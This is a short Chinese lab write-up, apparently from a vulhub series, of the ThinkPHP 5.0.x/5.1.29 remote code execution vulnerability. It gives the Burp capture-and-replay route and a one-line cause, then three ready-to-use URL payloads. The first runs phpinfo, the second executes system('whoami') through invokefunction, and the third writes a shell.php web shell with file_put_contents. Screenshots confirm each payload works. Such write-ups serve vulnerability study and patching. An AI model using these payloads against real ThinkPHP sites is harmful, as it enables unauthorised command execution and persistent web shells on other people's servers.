# Thinkphp5 5.0.22 / 5.1.29远程执行代码漏洞

###### by ADummy

### 0x00利用路线

​			burpuite抓包--->修改payload--->重放包--->代码执行--->有回显

### 0x01漏洞介绍

​			TThinkPHP是在中国使用极为广泛的PHP开发框架。在其版本5中，由于框架错误地处理了控制器名称，因此如果网站未启用强制路由（默认设置），则该框架可以执行任何方法，从而导致RCE漏洞。

###### 		ThinkPHP5 5.0.20 - 5.1.29

#### payload1：

/index.php?s=index/\think\app/invokefunction&function=phpinfo&vars[0]=100

#### payload2：

index.php?s=index/think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=whoami

#### payload3(文件写入)：

/index.php?s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=file_put_contents&vars[1][]=shell.php&vars[1][]=加你要写入的文件内容url编码



​			**默认页面**

![ThinkPHP_5_x_rce_1](https://github.com/ADummmy/vulhub_Writeup/blob/main/src/ThinkPHP_5_x_rce_1.jpg)

​			**payload1,phpinfo被执行**

![ThinkPHP_5_x_rce_2](https://github.com/ADummmy/vulhub_Writeup/blob/main/src/ThinkPHP_5_x_rce_2.jpg)

​			**payload2,whoami被执行**

​	![ThinkPHP_5_x_rce_3](https://github.com/ADummmy/vulhub_Writeup/blob/main/src/ThinkPHP_5_x_rce_3.jpg)



​			**payload3,phpinfo使用url编码**

![ThinkPHP_5_x_rce_4](https://github.com/ADummmy/vulhub_Writeup/blob/main/src/ThinkPHP_5_x_rce_4.jpg)

​			**payload3,访问shell.php phpinfo被执行**

![ThinkPHP_5_x_rce_5](https://github.com/ADummmy/vulhub_Writeup/blob/main/src/ThinkPHP_5_x_rce_5.jpg)

### 0x03参考资料

https://blog.csdn.net/qq_29647709/article/details/84956221

